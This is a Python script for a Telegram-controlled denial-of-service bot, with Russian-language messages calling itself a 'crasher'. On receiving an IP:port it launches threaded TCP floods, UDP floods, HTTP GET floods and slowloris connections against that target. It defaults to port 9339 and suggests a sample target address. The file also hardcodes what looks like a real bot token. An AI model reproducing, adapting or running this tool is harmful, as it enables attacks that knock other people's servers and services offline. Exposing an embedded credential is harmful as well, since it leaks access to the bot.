#!/usr/bin/env python3
import socket, struct, threading, random, time, re, os, sys, logging
import telebot
from telebot import types

BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
TCP_THREADS = 50
UDP_THREADS = 50
HTTP_THREADS = 30
SLOW_THREADS = 30

logging.basicConfig(level=logging.INFO, stream=sys.stdout)
logger = logging.getLogger(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {}

def tcp_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.send(os.urandom(random.randint(1024, 32768)))
            sock.close()
        except:
            pass

def udp_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(random.randint(1024, 65507)), (ip, port))
            sock.close()
        except:
            pass

def http_worker(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            for _ in range(10):
                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".encode())
            sock.close()
        except:
            pass

def slowloris_worker(ip, port, stop_flag):
    conns = []
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
            conns.append(sock)
            if len(conns) > 200:
                for old in conns[:50]:
                    try: old.close()
                    except: pass
                conns = conns[50:]
        except:
            pass
        time.sleep(5)

class Attack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
    def start(self):
        configs = [
            (tcp_worker, TCP_THREADS),
            (udp_worker, UDP_THREADS),
            (http_worker, HTTP_THREADS),
            (slowloris_worker, SLOW_THREADS),
        ]
        for func, count in configs:
            for _ in range(count):
                if self.stop_flag.is_set():
                    break
                t = threading.Thread(target=func, args=(self.ip, self.port, self.stop_flag), daemon=True)
                self.threads.append(t)
                t.start()
                time.sleep(0.01)
    def stop(self):
        self.stop_flag.set()

def parse_target(text):
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if m:
        return m.group(1), int(m.group(2))
    m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if m:
        return m.group(1), 9339
    return None, None

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "КРАШЕР ЗАПУЩЕН\nОтправь IP:PORT\n/stop")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        del active_attacks[cid]
        bot.reply_to(message, "Атака остановлена")
    else:
        bot.reply_to(message, "Нет активной атаки")

@bot.message_handler(func=lambda m: re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    ip, port = parse_target(message.text)
    if not ip:
        bot.reply_to(message, "Неверный IP")
        return
    if cid in active_attacks:
        bot.reply_to(message, "Атака уже идёт! /stop")
        return
    if not port:
        port = 9339
    attack = Attack(ip, port)
    attack.start()
    active_attacks[cid] = attack
    bot.reply_to(message, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nTCP:{TCP_THREADS} UDP:{UDP_THREADS} HTTP:{HTTP_THREADS} Slow:{SLOW_THREADS}\n/stop")

@bot.message_handler(func=lambda m: True)
def unknown_cmd(message):
    bot.reply_to(message, "Отправь IP:PORT\nПример: 34.240.15.100:9339\n/start")

if __name__ == "__main__":
    logger.info("Бот запущен")
    bot.remove_webhook()
    time.sleep(1)
    bot.polling(none_stop=True) 
